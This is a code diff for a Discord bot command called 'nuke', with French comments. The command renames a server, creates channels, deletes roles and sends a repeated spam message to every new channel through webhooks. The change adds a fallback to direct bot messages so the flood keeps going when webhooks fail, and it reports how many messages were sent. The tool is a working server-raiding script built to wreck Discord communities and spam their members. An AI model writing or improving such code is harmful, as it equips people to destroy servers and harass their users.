@@ -179,7 +179,7 @@ async def nuke(
     start = asyncio.get_event_loop().time()
     log.info('NUKE launched by %s on guild %s', interaction.user, guild.id)
 
-    # 1) Rename server (en // avec le reste si demande)
+    # 1) Rename serveur en parallele du reste
     rename_task = None
     if server_name:
         new = server_name.strip()[:100]
@@ -206,21 +206,35 @@ async def nuke(
     ]
     created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
 
-    # 4) Webhooks paralleles (1 par salon)
+    # 4) Webhooks paralleles (1 par salon) -- peut echouer sur certains salons
     webhooks = await asyncio.gather(*[_safe(c.create_webhook(name='nuke-hook')) for c in created])
 
-    # 5) Spam parallele via webhooks (rate-limit par-canal -> tres rapide)
-    async def flood(webhook):
-        if webhook is None:
-            return
+    # 5) Spam parallele : webhook si dispo, sinon fallback channel.send()
+    async def flood(channel, webhook):
+        sent = 0
         for _ in range(repeat):
-            try:
-                await webhook.send(content=message)
-            except discord.HTTPException as e:
-                log.warning('webhook send failed: %s', e)
-                await asyncio.sleep(0.3)
+            ok = False
+            # Tentative 1 : webhook (rapide)
+            if webhook is not None:
+                try:
+                    await webhook.send(content=message)
+                    ok = True
+                except Exception as e:
+                    log.warning('webhook send failed on %s: %s', channel.id, e)
+            # Fallback : envoi direct par le bot
+            if not ok:
+                try:
+                    await channel.send(content=message)
+                    ok = True
+                except discord.HTTPException as e:
+                    log.warning('channel.send failed on %s: %s', channel.id, e)
+                    await asyncio.sleep(0.5)
+            if ok:
+                sent += 1
+        return sent
 
-    await asyncio.gather(*[flood(w) for w in webhooks])
+    results = await asyncio.gather(*[flood(c, w) for c, w in zip(created, webhooks)])
+    total_sent = sum(results)
 
     # 6) Attendre la fin du rename si lance
     if rename_task:
@@ -232,7 +246,8 @@ async def nuke(
         f'**NUKE termine en {elapsed:.1f}s**\n'
         f'- {len(created)}/{channels} salons crees\n'
         f'- {len(role_targets)} roles supprimes\n'
-        f'- {repeat} messages / salon ({len([w for w in webhooks if w])} webhooks)\n'
+        f'- {total_sent} messages envoyes ({repeat} prevus x {len(created)} salons)\n'
+        f'- {len([w for w in webhooks if w])} webhooks actifs (le reste en fallback bot)\n'
         + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
     )
     if created:
